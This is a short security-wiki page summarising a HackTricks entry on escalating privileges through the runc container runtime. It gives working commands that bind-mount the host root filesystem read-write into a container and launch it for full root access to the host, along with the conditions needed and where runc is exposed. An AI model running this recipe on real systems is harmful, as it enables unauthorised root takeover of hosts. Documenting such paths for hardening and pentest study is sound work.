---
title: "HackTricks: runc Privilege Escalation"
tags: [linux-hardening, privilege-escalation, container-security, runc]
sources: [hacktricks-runc-privilege-escalation.md]
updated: 2026-05-01
---

# HackTricks: runc Privilege Escalation

Source: [hacktricks-runc-privilege-escalation.md](../../raw/hacktricks-runc-privilege-escalation.md)

## Key Takeaways

If `runc` is installed and accessible, an attacker can craft an OCI `config.json` that bind-mounts the host root filesystem and launch a container with full host access. This works because `runc` by default runs as root — no additional privileges are needed beyond being able to invoke it. Rootless runc configurations impose enough restrictions that this specific path fails, but rootless configs are not the default.

## Exploit

```bash
runc spec    # generates default config.json in current directory

# Edit config.json: add to the "mounts" array:
# {
#   "type": "bind",
#   "source": "/",
#   "destination": "/",
#   "options": ["rbind", "rw", "rprivate"]
# },

mkdir rootfs          # runc requires a rootfs directory to exist

runc run demo         # launches container with host / mounted at /
# Now inside container: complete host filesystem access as root
```

## Conditions

- `runc` binary must be reachable and executable
- Does **not** work with unprivileged (rootless) runc — rootless configs restrict the necessary bind mount capability
- The current directory needs write permissions to create `config.json` and `rootfs/`

## Context

`runc` is the OCI reference runtime. It underlies Docker, containerd, and most Kubernetes CRI implementations. Direct `runc` access is unusual in production but may appear on dev/build systems, CI runners, or misconfigured containers where the host binary is volume-mounted inside.

## Related

- [container-security](../concepts/container-security.md)
- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: containerd (ctr) Privilege Escalation](hacktricks-containerd-ctr-privilege-escalation.md)
- [HackTricks](../entities/hacktricks.md)
